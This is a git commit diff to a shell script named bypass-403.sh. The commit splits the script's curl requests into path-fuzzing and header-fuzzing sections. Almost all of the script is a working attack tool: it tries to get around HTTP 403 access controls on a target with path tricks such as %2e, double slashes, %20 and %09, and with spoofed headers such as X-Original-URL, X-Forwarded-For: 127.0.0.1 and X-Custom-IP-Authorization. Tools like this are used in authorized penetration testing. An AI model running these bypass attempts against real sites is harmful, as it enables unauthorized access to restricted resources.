442ee91facb963aa5fa2f1a8295cf015776d4230
Kirill Zhdanov <storenth@yandex.ru>
2021-07-12 17:19:10 +0700

    split path and headers fuzz steps

--- bypass-403.sh
+++ bypass-403.sh
@@ -7,11 +7,12 @@ checkhelp(){
 }
 
 if [ $# -eq 1 ]; then
-    checkhelp "$@"
+    checkhelp "$@" 
 fi
 # alias
-curlrequest='curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}"'
+curlrequest='curl -k -s -o /dev/null -iL -w "status:%{http_code}","size:%{size_download}"'
 
+# path fuzzing
 $curlrequest $1/$2
 echo "  --> ${1}/${2}"
 $curlrequest $1/%2e/$2
@@ -22,17 +23,6 @@ $curlrequest $1//$2//
 echo "  --> ${1}//${2}//"
 $curlrequest $1/./$2/./
 echo "  --> ${1}/./${2}/./"
-$curlrequest -H "X-Original-URL: $2" $1/$2
-echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
-$curlrequest -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
-echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
-$curlrequest -H "X-Forwarded-For: http://127.0.0.1" $1/$2
-echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
-$curlrequest -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
-echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
-$curlrequest -H "X-rewrite-url: $2" $1
-echo "  --> ${1} -H X-rewrite-url: ${2}"
-#updated
 $curlrequest $1/$2%20
 echo "  --> ${1}/${2}%20"
 $curlrequest $1/$2%09
@@ -45,3 +35,15 @@ $curlrequest $1/$2/?anything
 echo "  --> ${1}/${2}/?anything"
 $curlrequest $1/$2#
 echo "  --> ${1}/${2}#"
+
+# headers fuzzing
+$curlrequest -H "X-Original-URL: $2" $1/$2
+echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
+$curlrequest -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
+echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
+$curlrequest -H "X-Forwarded-For: http://127.0.0.1" $1/$2
+echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
+$curlrequest -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
+echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
+$curlrequest -H "X-rewrite-url: $2" $1
+echo "  --> ${1} -H X-rewrite-url: ${2}"
